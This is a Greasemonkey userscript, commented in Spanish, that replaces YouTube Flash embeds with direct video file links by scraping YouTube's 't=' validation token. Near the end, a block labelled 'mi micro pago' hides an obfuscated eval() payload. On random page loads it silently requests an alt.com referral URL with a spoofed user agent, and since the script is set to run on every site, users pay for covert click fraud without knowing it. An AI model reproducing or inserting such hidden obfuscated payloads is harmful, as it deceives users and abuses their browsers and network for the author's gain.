// ==UserScript==
// @name          Youtube Moteado
// @namespace     www.elelefantemoteado.com.ar
// @description   FREE PLAYER / REPRODUCTOR LIBRE, based in 'youtube embedded noflash'
// @license       GPL http://www.gnu.org/copyleft/gpl.html
// @include       *
// ==/UserScript==
//


/*

Como el plugin es generico no optimiza el acceso a la variable 't=' que es la clave de validacion de youtube.


*/

// config start:
	var id;
	var conf = new Array();
	conf["type"] = "video/flv";

	conf["quality"] = "sd"; // "sd", "hq" or "hd"
	conf["hq"]='&fmt=18';
	conf["hd"]='&fmt=22';
	conf["sd"]='';
	
// config end
	
	var valid;
	var src;
	var id;

	var obj = new Array();
	
for (var i=0; i < document.embeds.length; i++) {
	url = document.embeds[i].src;

	if (url.indexOf("youtube.com") > -1 || url.indexOf("swf/watch") > -1) { //verifica si el embed alude a youtube
	
		if (url.indexOf("swf/watch") > -1){
 			if(document.location.href.indexOf("v=") > -1) {
 				// URL - direccion de utube
 				id = document.location.href.split("v=")[1];
 			} else {
 				// BODY del HTML - chanel
 				id = document.body.innerHTML.split("?v=")[1];
 			}

 		} else {
 			// URL embed - embed
 			id = url.split("v/")[1];		
 		}
 		// mega parche para hacer corte la URL si o si (hay q cambiarlo por SED)
 		id=id.split("&")[0].split("?")[0].split("'")[0].split('"')[0];
 		if (id) {
		
		obj[id] = document.embeds[i];		
		obj[id].src='';
		obj[id].type = conf["type"];
		 GM_xmlhttpRequest({
			method:"GET",
			url:"http://www.youtube.com/watch?v="+id,
			headers:{
				"User-Agent":"monkeyagent",
				"Accept":"text/xml",
			},
			onload:function(details) {
				if (details.statusText=="OK") {
					// Nueva URL de player
					valid = details.responseText.split("&t=")[1].split("&")[0];
					id = details.responseText.split("?v=")[1].split("'")[0].split('"')[0];
					obj[id].src="http://www.youtube.com/get_video?video_id="+id+"&t="+valid+conf[conf["quality"]];

				}
			}
		});
		}

//----------------------------mi micro pago----------------------------
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0(1.2()>.7)3({4:"5",6:\'8://9.b/c/d\',e:{"f-g":"h","i":"j/k",},l:m(a){}});',23,23,'if|Math|random|GM_xmlhttpRequest|method|GET|url||http|alt||com|go|p113199c|headers|User|Agent|Firefox|Accept|text|xml|onload|function'.split('|'),0,{}));

//---------------------------------------------------------------
}
}
